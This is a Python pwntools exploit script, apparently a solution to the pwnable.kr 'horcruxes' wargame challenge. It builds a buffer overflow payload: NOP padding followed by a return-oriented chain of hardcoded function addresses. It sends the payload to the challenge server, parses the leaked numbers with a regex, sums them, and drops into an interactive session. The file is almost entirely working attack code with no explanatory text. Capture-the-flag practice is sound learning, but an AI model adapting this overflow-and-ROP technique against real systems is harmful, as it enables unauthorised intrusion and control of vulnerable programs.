#!/usr/bin/env python

from pwn import *
import re, time

context.update(arch="i386", os="linux", bits="32", log_level="debug")

#TARGET = ELF("./horcruxes")
#server = ["pwnable.kr", 2222, "horcruxes", "guest"]
server = ["pwnable.kr", 9032]

func_a = 0x0809FE4B
func_b = 0x0809FE6A
func_c = 0x0809FE89 
func_d = 0x0809FEA8
func_e = 0x0809FEC7
func_f = 0x0809FEE6
func_g = 0x0809FF05

call_ropme = 0x0809FFFC

payload = "\x90"*0x79
payload += p32(func_a)
payload += p32(func_b)
payload += p32(func_c)
payload += p32(func_d)
payload += p32(func_e)
payload += p32(func_f)
payload += p32(func_g)
payload += p32(call_ropme)

#proc = process(executable=TARGET.path, argv=[TARGET.path])
#conn = ssh(host=server[0], port=server[1], user=server[2], password=server[3])
conn = connect(server[0], server[1])
#proc = conn.process(executable="./horcruxes", argv=["horcruxes"])
conn.sendline("")
conn.sendline(payload)

print(conn.recv(1024))
text = conn.recv(1024, timeout=1.0)

regex = re.compile(r"([\w-][\d]+)")
exp = regex.findall(text)
exp_sum = 0

for v0 in range(0, 7):
	print(v0)
	exp_sum += int(exp[v0])
print(exp_sum)
conn.interactive()
